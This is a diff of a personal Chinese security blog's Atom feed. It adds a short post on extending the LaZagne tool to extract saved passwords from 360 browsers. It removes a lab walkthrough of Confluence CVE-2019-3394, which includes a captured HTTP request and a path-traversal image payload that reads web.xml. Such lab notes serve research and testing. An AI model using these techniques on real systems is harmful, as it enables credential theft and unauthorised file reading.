@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-11-13T04:46:14.078Z</updated>
+  <updated>2020-11-15T06:27:53.785Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>lazagne-360</title>
+    <link href="http://sherlocz.github.io/2020/11/15/lazagne-360/"/>
+    <id>http://sherlocz.github.io/2020/11/15/lazagne-360/</id>
+    <published>2020-11-15T06:03:37.000Z</published>
+    <updated>2020-11-15T06:27:53.785Z</updated>
+    
+    <content type="html"><![CDATA[<p>其实三好学生之前写过自定义lazagne抓取不同浏览器密码：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/" title="https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/" target="_blank" rel="noopener">本地密码查看工具LaZagne中的自定义脚本开发</a></p><p>不过他这个版本很老了，又看见有师傅再问怎么抓取360极速浏览器的密码，之前也尝试过，简单做做笔记。</p><p>下载LaZagne:<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><p>我们这里就编译windows版本的，由于360极速浏览器也是用的chrome内核，其实我们只需要将浏览器保存密码的路径修改一下就行了。</p><p>修改aZagne-master\Windows\lazagne\softwares\browsers\chromium_based.py中的225行数组，将下列代码添加到数组中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(u&apos;360CEC&apos;, u&apos;&#123;LOCALAPPDATA&#125;\\360Chrome\\Chrome\\User Data&apos;),</span><br><span class="line">    (u&apos;360se6&apos;, u&apos;&#123;APPDATA&#125;\\360se6\User Data&apos;),</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/15/lazagne-360/change.png" alt><br>然后重新编译LaZagne：<a href="https://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/" title="https://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/">LaZagne编译抓取浏览器密码</a></p><p>效果如图：<br><img src="/2020/11/15/lazagne-360/success.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;其实三好学生之前写过自定义lazagne抓取不同浏览器密码：&lt;a href=&quot;https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9
+      
+    
+    </summary>
+    
+    
+    
+      <category term="密码抓取" scheme="http://sherlocz.github.io/tags/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
+    
+  </entry>
   
   <entry>
     <title>SYSVOL</title>
@@ -485,30 +509,6 @@
     
     
       <category term="应急响应" scheme="http://sherlocz.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Confluence文件读取漏洞复现(CVE-2019-3394)</title>
-    <link href="http://sherlocz.github.io/2020/03/24/Confluence%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-3394/"/>
-    <id>http://sherlocz.github.io/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/</id>
-    <published>2020-03-24T02:30:01.000Z</published>
-    <updated>2020-03-24T04:08:00.344Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>6.1.0 &lt;= version &lt; 6.6.16<br>6.7.0 &lt;= version &lt; 6.13.7<br>6.14.0 &lt;= version &lt; 6.15.8</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用P师傅的vulhub直接上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br><span class="line"># Download the latest version of the vulhub </span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  </span><br><span class="line"># Entry vulnerability directory </span><br><span class="line">cd /confluence/CVE-2019-3396/</span><br><span class="line"># Compile (optional) </span><br><span class="line">docker-compose build </span><br><span class="line"># Run </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>安装完成之后本地会开启8090端口，我们根据导向进行安装<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/1.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/2.png" alt><br>这里我们需要去官网获取一个licence，注意这里的Server ID，成功获取之后在Setup页面点击下一步，等他转圈圈就行了<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/3.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/4.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/5.png" alt><br>然后稀里糊涂就安装成功了。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>创建页面的时候抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /rest/api/content/65603?status=draft HTTP/1.1</span><br><span class="line">Host: 192.168.75.138:8090</span><br><span class="line">Content-Length: 373</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.75.138:8090</span><br><span class="line">Referer: http://192.168.75.138:8090/pages/resumedraft.action?draftId=65603&amp;draftShareId=e3bf8f62-5cdc-4586-ae67-0098ed31f5a5</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=EB2B904418498E2A22446B8A4D44664A</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;current&quot;,&quot;title&quot;:&quot;123123&quot;,&quot;space&quot;:&#123;&quot;key&quot;:&quot;SHER&quot;&#125;,&quot;body&quot;:&#123;&quot;editor&quot;:&#123;&quot;value&quot;:&lt;p&gt;1231231&lt;/p&gt;</span><br><span class="line">&quot;,&quot;representation&quot;:&quot;editor&quot;,&quot;content&quot;:&#123;&quot;id&quot;:&quot;65603&quot;&#125;&#125;&#125;,&quot;id&quot;:&quot;65603&quot;,&quot;type&quot;:&quot;page&quot;,&quot;version&quot;:&#123;&quot;number&quot;:1,&quot;minorEdit&quot;:true,&quot;syncRev&quot;:&quot;0.2ROrHE4DizkcCc1u6UtkBrc.10&quot;&#125;,&quot;ancestors&quot;:[&#123;&quot;id&quot;:&quot;65584&quot;,&quot;type&quot;:&quot;page&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure></p><p>将其中的value值修改成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;img class=\&quot;confluence-embedded-image\&quot; src=\&quot;/packages/../web.xml\&quot; /&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>然后再导出word的时候抓包</p><p><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/6.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/7.png" alt></p><p>RCE<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/8.png" alt></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/jas502n/CVE-2019-3394" title="https://github.com/jas502n/CVE-2019-3394" target="_blank" rel="noopener">CVE-2019-3394</a><br><a href="https://github.com/Yt1g3r/CVE-2019-3396_EXP" title="https://github.com/Yt1g3r/CVE-2019-3396_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2019-3396_EXP</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h1&gt;&lt;p&gt;6.1.0 &amp;lt;= version &amp;lt; 6.6.16&lt;br&gt;6.7.0 &amp;lt;= version &amp;lt; 6.
-      
-    
-    </summary>
-    
-    
-    
-      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
   </entry>
   
